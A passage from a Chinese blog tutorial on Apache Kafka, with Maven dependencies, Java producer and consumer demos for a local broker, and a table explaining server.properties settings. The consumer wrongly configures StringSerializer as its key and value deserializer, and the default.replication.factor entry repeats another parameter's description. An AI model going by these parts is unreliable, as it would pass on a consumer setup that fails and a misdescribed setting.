punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.kafka<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>kafka_2.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.kafka<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>kafka-clients<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生产者样例代码：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>KafkaProducer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerConfig<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span>ProducerRecord<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>common<span class="token punctuation">.</span>serialization<span class="token punctuation">.</span>StringSerializer<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * &lt;PRE> * kafka生产者样例 * &lt;/PRE> * &lt;br/>&lt;B>PROJECT : &lt;/B> kafka * &lt;br/>&lt;B>SUPPORT : &lt;/B> &lt;a href="http://www.exp-blog.com" target="_blank">www.exp-blog.com&lt;/a>  * @version   2018-08-02 * @author    EXP: 272629724@qq.com * @since     jdk版本：jdk1.6 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoProducer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">final</span> String KAFKA_SOCKET <span class="token operator">=</span> <span class="token string">"127.0.0.1:9092"</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> String TOPIC <span class="token operator">=</span> <span class="token string">"exp-topic-test"</span><span class="token punctuation">;</span>        DemoProducer producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DemoProducer</span><span class="token punctuation">(</span>KAFKA_SOCKET<span class="token punctuation">)</span><span class="token punctuation">;</span>        producer<span class="token punctuation">.</span><span class="token function">produce</span><span class="token punctuation">(</span>TOPIC<span class="token punctuation">)</span><span class="token punctuation">;</span>        producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/** kafka生产者对象 */</span>    <span class="token keyword">private</span> KafkaProducer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> producer<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 构造函数     * @param kafkaSocket     */</span>    <span class="token keyword">private</span> <span class="token function">DemoProducer</span><span class="token punctuation">(</span>String kafkaSocket<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ProducerConfig<span class="token punctuation">.</span>BOOTSTRAP_SERVERS_CONFIG<span class="token punctuation">,</span> kafkaSocket<span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ProducerConfig<span class="token punctuation">.</span>VALUE_SERIALIZER_CLASS_CONFIG<span class="token punctuation">,</span> StringSerializer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ProducerConfig<span class="token punctuation">.</span>KEY_SERIALIZER_CLASS_CONFIG<span class="token punctuation">,</span> StringSerializer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 连续发送消息到指定主题     * @param TOPIC 消息主题, 当主题只有一个分区时, 逻辑上可以认为主题是一个队列     *         （当前版本的kafka默认会自动创建不存在的主题, 无需预建）     * @throws Exception     */</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">produce</span><span class="token punctuation">(</span><span class="token keyword">final</span> String TOPIC<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String data <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"[%s] http://exp-blog.com"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ProducerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> msg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span>TOPIC<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>            Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>消费者样例代码：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Arrays<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>Consumer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>ConsumerConfig<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>ConsumerRecord<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>ConsumerRecords<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span>KafkaConsumer<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>common<span class="token punctuation">.</span>serialization<span class="token punctuation">.</span>StringSerializer<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * &lt;PRE> * kafka消费者样例 * &lt;/PRE> * &lt;br/>&lt;B>PROJECT : &lt;/B> kafka * &lt;br/>&lt;B>SUPPORT : &lt;/B> &lt;a href="http://www.exp-blog.com" target="_blank">www.exp-blog.com&lt;/a>  * @version   2018-08-02 * @author    EXP: 272629724@qq.com * @since     jdk版本：jdk1.6 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoConsumer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">final</span> String KAFKA_SOCKET <span class="token operator">=</span> <span class="token string">"127.0.0.1:9092"</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> String TOPIC <span class="token operator">=</span> <span class="token string">"exp-topic-test"</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> String GROUP_ID <span class="token operator">=</span> <span class="token string">"group-1"</span><span class="token punctuation">;</span>        DemoConsumer consumer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DemoConsumer</span><span class="token punctuation">(</span>KAFKA_SOCKET<span class="token punctuation">,</span> GROUP_ID<span class="token punctuation">)</span><span class="token punctuation">;</span>        consumer<span class="token punctuation">.</span><span class="token function">consume</span><span class="token punctuation">(</span>TOPIC<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/** kafka消费者对象 */</span>    <span class="token keyword">private</span> Consumer<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> consumer<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 构造函数     * @param kafkaSocket     * @param groupId Consumer所在的Group     *         （一个Topic可以对应多个Group, 不论是多播还是单播, kafka只会把消息发到Group,      *           Consumer只能收到它所在的Group的消息）     */</span>    <span class="token keyword">private</span> <span class="token function">DemoConsumer</span><span class="token punctuation">(</span>String kafkaSocket<span class="token punctuation">,</span> String groupId<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ConsumerConfig<span class="token punctuation">.</span>BOOTSTRAP_SERVERS_CONFIG<span class="token punctuation">,</span> kafkaSocket<span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ConsumerConfig<span class="token punctuation">.</span>GROUP_ID_CONFIG<span class="token punctuation">,</span> groupId<span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ConsumerConfig<span class="token punctuation">.</span>AUTO_OFFSET_RESET_CONFIG<span class="token punctuation">,</span> <span class="token string">"latest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 消息偏移, latest表示最新的消息</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ConsumerConfig<span class="token punctuation">.</span>ENABLE_AUTO_COMMIT_CONFIG<span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 自动提交</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ConsumerConfig<span class="token punctuation">.</span>AUTO_COMMIT_INTERVAL_MS_CONFIG<span class="token punctuation">,</span> <span class="token string">"1000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 自动提交间隔(ms)</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ConsumerConfig<span class="token punctuation">.</span>SESSION_TIMEOUT_MS_CONFIG<span class="token punctuation">,</span> <span class="token string">"30000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 会话超时(ms)</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ConsumerConfig<span class="token punctuation">.</span>KEY_DESERIALIZER_CLASS_CONFIG<span class="token punctuation">,</span>                 StringSerializer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>ConsumerConfig<span class="token punctuation">.</span>VALUE_DESERIALIZER_CLASS_CONFIG<span class="token punctuation">,</span>                 StringSerializer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>consumer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaConsumer</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 从指定主题连续消费消息     * @param TOPICS 消息主题集, 当主题只有一个分区时, 逻辑上可以认为主题是一个队列     * @throws Exception      */</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"deprecation"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">consume</span><span class="token punctuation">(</span><span class="token keyword">final</span> String<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> TOPICS<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        consumer<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>TOPICS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 可同时消费多个topic</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            ConsumerRecords<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> records <span class="token operator">=</span> consumer<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>ConsumerRecord<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> record <span class="token operator">:</span> records<span class="token punctuation">)</span> <span class="token punctuation">{</span>                String msg <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"offset = %d, key = %s, value = %s"</span><span class="token punctuation">,</span>                         record<span class="token punctuation">.</span><span class="token function">offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> record<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>                Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        consumer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8-附录1：kafka常见的错误与解决方法"><a href="#8-附录1：kafka常见的错误与解决方法" class="headerlink" title="8. 附录1：kafka常见的错误与解决方法"></a>8. 附录1：kafka常见的错误与解决方法</h2><p>Kafka运维填坑：<a href="https://www.jianshu.com/p/d2cbaae38014">https://www.jianshu.com/p/d2cbaae38014</a></p><h2 id="9-附录2：server-properties参数说明"><a href="#9-附录2：server-properties参数说明" class="headerlink" title="9. 附录2：server.properties参数说明"></a>9. 附录2：server.properties参数说明</h2><table><thead><tr><th align="left">参数与默认值</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">broker.id =0</td><td align="left">每一个broker在集群中的唯一表示，要求是正数。当该服务器的IP地址发生<br>改变时，broker.id没有变化，则不会影响consumers的消息情况</td></tr><tr><td align="left">log.dirs=/data/kafka-logs</td><td align="left">kafka数据的存放目录（必须是绝对路径），多个目录用逗号分割。<br>多个目录分布在不同磁盘上可以提高读写性能，<br>如： /data/kafka-logs-1，/data/kafka-logs-2</td></tr><tr><td align="left">port =9092</td><td align="left">broker server服务端口</td></tr><tr><td align="left">message.max.bytes =6525000</td><td align="left">表示消息体的最大大小，单位是字节</td></tr><tr><td align="left">num.network.threads =4</td><td align="left">broker处理消息的最大线程数，<br>一般情况下数量为cpu核数</td></tr><tr><td align="left">num.io.threads =8</td><td align="left">broker处理磁盘IO的线程数，数值为cpu核数2倍</td></tr><tr><td align="left">background.threads =4</td><td align="left">一些后台任务处理的线程数，例如过期消息文件的删除等，<br>一般情况下不需要去做修改</td></tr><tr><td align="left">queued.max.requests =500</td><td align="left">等待IO线程处理的请求队列最大数，若是等待IO的请求超过这个数值，<br>那么会停止接受外部消息，应该是一种自我保护机制</td></tr><tr><td align="left">host.name</td><td align="left">broker的主机地址，若是设置了，那么会绑定到这个地址上，若是没有，<br>会绑定到所有的接口上，并将其中之一发送到ZK，一般不设置</td></tr><tr><td align="left">socket.send.buffer.bytes=100*1024</td><td align="left">socket的发送缓冲区，socket的调优参数SO_SNDBUFF</td></tr><tr><td align="left">socket.receive.buffer.bytes =100*1024</td><td align="left">socket的接受缓冲区，socket的调优参数SO_RCVBUFF</td></tr><tr><td align="left">socket.request.max.bytes =100*1024*1024</td><td align="left">socket请求的最大数值，防止serverOOM，message.max.bytes必然要小于<br>socket.request.max.bytes，会被topic创建时的指定参数覆盖</td></tr><tr><td align="left">log.segment.bytes =1024*1024*1024</td><td align="left">topic的分区是以一堆segment文件存储的，这个控制每个segment的大小，会被<br>topic创建时的指定参数覆盖</td></tr><tr><td align="left">log.roll.hours =24*7</td><td align="left">这个参数会在日志segment没有达到log.segment.bytes设置的大小，<br>也会强制新建一个segment会被topic创建时的指定参数覆盖</td></tr><tr><td align="left">log.cleanup.policy = delete</td><td align="left">日志清理策略选择有：delete和compact主要针对过期数据的处理，<br>或是日志文件达到限制的额度，会被topic创建时的指定参数覆盖</td></tr><tr><td align="left">log.retention.minutes=300或log.retention.hours=24</td><td align="left">数据文件保留多长时间， 存储的最大时间超过这个时间会根据log.cleanup.policy设置数据清除策略。<br>有2种删除数据文件方式：<br>① 按文件大小删除：log.retention.bytes<br>② 按2种不同时间粒度删除：分钟log.retention.minutes、小时log.retention.hours</td></tr><tr><td align="left">log.retention.bytes=-1</td><td align="left">topic每个分区的最大文件大小<br>一个topic的大小限制=分区数*log.retention.bytes<br>-1表示没有大小限制。该参数会被topic创建时的指定参数覆盖</td></tr><tr><td align="left">log.retention.check.interval.ms=5minutes</td><td align="left">文件大小检查的周期时间，是否处罚log.cleanup.policy中设置的策略</td></tr><tr><td align="left">log.cleaner.enable=false</td><td align="left">是否开启日志清理</td></tr><tr><td align="left">log.cleaner.threads =2</td><td align="left">日志清理运行的线程数</td></tr><tr><td align="left">log.cleaner.io.max.bytes.per.second=None</td><td align="left">日志清理时候处理的最大大小</td></tr><tr><td align="left">log.cleaner.dedupe.buffer.size=500*1024*1024</td><td align="left">日志清理去重时候的缓存空间，在空间允许的情况下，越大越好</td></tr><tr><td align="left">log.cleaner.io.buffer.size=512*1024</td><td align="left">日志清理时候用到的IO块大小一般不需要修改</td></tr><tr><td align="left">log.cleaner.io.buffer.load.factor =0.9</td><td align="left">日志清理中hash表的扩大因子一般不需要修改</td></tr><tr><td align="left">log.cleaner.backoff.ms =15000</td><td align="left">检查是否处罚日志清理的间隔</td></tr><tr><td align="left">log.cleaner.min.cleanable.ratio=0.5</td><td align="left">日志清理的频率控制，越大意味着更高效的清理，<br>同时会存在一些空间上的浪费，会被topic创建时的指定参数覆盖</td></tr><tr><td align="left">log.cleaner.delete.retention.ms =1day</td><td align="left">对于压缩的日志保留的最长时间，也是客户端消费消息的最长时间，同<br>log.retention.minutes的区别在于一个控制未压缩数据，一个控制压缩后的数据。<br>会被topic创建时的指定参数覆盖</td></tr><tr><td align="left">log.index.size.max.bytes =10*1024*1024</td><td align="left">对于segment日志的索引文件大小限制，会被topic创建时的指定参数覆盖</td></tr><tr><td align="left">log.index.interval.bytes =4096</td><td align="left">当执行一个fetch操作后，需要一定的空间来扫描最近的offset大小，<br>设置越大，代表扫描速度越快，但是也更好内存，一般情况下不需要配置这个参数</td></tr><tr><td align="left">log.flush.interval.messages=None</td><td align="left">log文件“sync”到磁盘之前累积的消息条数，例如log.flush.interval.messages=1000表示每当消息记录数达到1000时flush一次数据到磁盘。<br>因为磁盘IO操作是一个慢操作，但又是一个“数据可靠性”的必要手段，<br>所以此参数的设置，需要在“数据可靠性”与“性能”之间做必要的权衡。<br>如果此值过大，将会导致每次“fsync”的时间较长（IO阻塞），<br>如果此值过小，将会导致“fsync”的次数较多，这也意味着整体的client请求有一定的延迟。<br>物理server故障，将会导致没有fsync的消息丢失</td></tr><tr><td align="left">log.flush.scheduler.interval.ms =3000</td><td align="left">检查是否需要固化到硬盘的时间间隔</td></tr><tr><td align="left">log.flush.interval.ms = None</td><td align="left">仅仅通过interval来控制消息的磁盘写入时机是不够的。<br>此参数用于控制“fsync”的时间间隔，如果消息量始终没有达到阀值，但是离<br>上一次磁盘同步的时间间隔达到阀值，也将触发。例如：log.flush.interval.ms=1000表示每间隔1000毫秒flush一次数据到磁盘</td></tr><tr><td align="left">log.delete.delay.ms =60000</td><td align="left">文件在索引中清除后保留的时间一般不需要去修改</td></tr><tr><td align="left">log.flush.offset.checkpoint.interval.ms =60000</td><td align="left">控制上次固化硬盘的时间点，以便于数据恢复一般不需要去修改</td></tr><tr><td align="left">auto.create.topics.enable =true</td><td align="left">是否允许自动创建topic，若是false，就需要通过命令创建topic</td></tr><tr><td align="left">default.replication.factor =1</td><td align="left">是否允许自动创建topic，若是false，就需要通过命令创建topic</td></tr><tr><td align="left">num.partitions =1</td><td align="left">每个topic的分区个数，若是在topic创建时候没有指定<br>则会被topic创建时的指定参数覆盖</td></tr><tr><td align="left">controller.socket.timeout.ms =30000</td><td align="left">partition leader与replicas之间通讯时，socket的超时时间</td></tr><tr><td align="left">controller.message.queue.size=10</td><td align="left">partition leader与replicas数据同步时，消息的队列尺寸</td></tr><tr><td align="left">replica.lag.time.max.ms =10000</td><td align="left">replicas响应partition leader的最长等待时间，若是超过这个时间，<br>就将replicas列入ISR(in-sync replicas)，并认为它是死的，不会再加入管理中</td></tr><tr><td align="left">replica.lag.max.messages =4000</td><td align="left">如果follower落后与leader太多，将会认为此follower（或者说partition relicas）已经失效。通常，在follower与leader通讯时，因为网络延迟或者链接断开，<br>总会导致replicas中消息同步滞后。如果消息之后太多，leader将认为此follower网络延迟较大或者消息吞吐能力有限，将会把此replicas迁移到其他follower中。<br>在broker数量较少，或者网<br>络不足的环境中，建议提高此值</td></tr><tr><td align="left">replica.socket.timeout.ms=30*1000</td><td align="left">follower与leader之间的socket超时时间</td></tr><tr><td align="left">replica.socket.receive.buffer.bytes=64*1024</td><td align="left">leader复制时候的socket缓存大小</td></tr><tr><td align="left">replica.fetch.max.bytes =1024*1024</td><td align="left">replicas每次获取数据的最大大小</td></tr><tr><td align="left">replica.fetch.wait.max.ms =500</td><td align="left">replicas同leader之间通信的最大等待时间，失败了会重试</td></tr><tr><td align="left">replica.fetch.min.bytes =1</td><td align="left">fetch的最小数据尺寸，如果leader中尚未同步的数据不足此值，<br>将会阻塞直到满足条件</td></tr><tr><td align="left">num.replica.fetchers=1</td><td align="left">leader进行复制的线程数，增大这个数值会增加follower的IO</td></tr><tr><td align="left">replica.high.watermark.checkpoint.interval.ms =5000</td><td align="left">每个replica检查是否将最高水位进行固化的频率</td></tr><tr><td align="left">controlled.shutdown.enable =false</td><td align="left">是否允许控制器关闭broker，若是设置为true，<br>会关闭所有在这个broker上的leader，并转移到其他broker</td></tr><tr><td align="left">controlled.shutdown.max.retries =3</td><td align="left">控制器关闭的尝试次数</td></tr><tr><td align="left">controlled.shutdown.retry.backoff.ms =5000</td><td align="left">每次关闭尝试的时间间隔</td></tr><tr><td align="left">leader.imbalance.per.broker.percentage =10</td><td align="left">leader的不平衡比例，若是超过这个数值，会对分区进行重新的平衡</td></tr><tr><td align="left">leader.imbalance.check.interval.seconds =300</td><td align="left">检查leader是否不平衡的时间间隔</td></tr><tr><td align="left">offset.metadata.max.bytes</td><td align="left">客户端保留offset信息的最大空间大小</td></tr><tr><td align="left">zookeeper.connect = localhost:2181</td><td align="left">zookeeper集群的地址（连接串），可以是多个，多个之间用逗号分割。<br>例如：hostname1:port1,hostname2:port2,hostname3:port3</td></tr><tr><td align="left">zookeeper.session.timeout.ms=6000</td><td align="left">zooKeeper的最大超时时间，就是心跳的间隔。<br>若是没有反应，那么认为已经死了，因此该值不易过大</td></tr><tr><td align="left">zookeeper.connection.timeout.ms =6000</td><td 